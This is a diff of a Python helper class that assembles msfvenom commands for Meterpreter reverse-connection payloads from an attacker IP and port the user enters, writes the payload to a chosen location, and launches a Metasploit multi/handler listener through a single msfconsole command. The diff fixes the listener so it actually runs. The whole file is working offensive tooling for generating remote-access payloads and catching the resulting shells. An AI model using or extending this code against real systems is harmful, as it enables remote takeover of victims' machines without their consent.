@@ -1,10 +1,13 @@
 import os
 import time
 
-# https://en.redinskala.com/starting-a-handler-with-metasploit/
-# https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
 
 class metasploit_generator():
+
+    '''For this class, you need to have the metasploit framework installed.'''
+
+    # https://en.redinskala.com/starting-a-handler-with-metasploit/
+    # https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
 
     def __init__(self):
 
@@ -46,7 +49,7 @@ class metasploit_generator():
         self.attacker_port_nuber = input("Please enter your port: ")
 
 
-        self.command = "msfvenom -p " + self.attack_operating_system + "/meterpreter/" + self.attack_method + " LHOST=" + self.attacker_ip_adress + " LPORT=" + self.attacker_port_nuber + self.attack_file_type + " > " + self.payload_name
+        self.command = "msfvenom -p " + self.attack_operating_system + "/meterpreter/" + self.attack_method + " LHOST=" + self.attacker_ip_adress + " LPORT=" + self.attacker_port_nuber + self.attack_file_type + " > " + self.payload_location + self.payload_name
 
         print("Your Command: ")
         print(self.command)
@@ -78,13 +81,9 @@ class metasploit_generator():
     def run_listener(self):
 
         try:
-        
-            os.system("msfconsole")
-            os.system("use multi/handler")
-            os.system("set payload " + self.attack_operating_system + "/meterpreter/" + self.attack_method)
-            os.system("set LHOST " + self.attacker_ip_adress)
-            os.system("set LPORT " + self.attacker_port_nuber)
-            os.system("exploit")
+
+            self.listerner_string = "msfconsole -q -x 'use multi/handler;set payload " + self.attack_operating_system + "/meterpreter/" + self.attack_method + ";" + "set LHOST " + self.attacker_ip_adress + ";" + "set LPORT " + self.attacker_port_nuber + ";" + "exploit'"
+            os.system(self.listerner_string)
 
         except:
             print("Could not start listener")
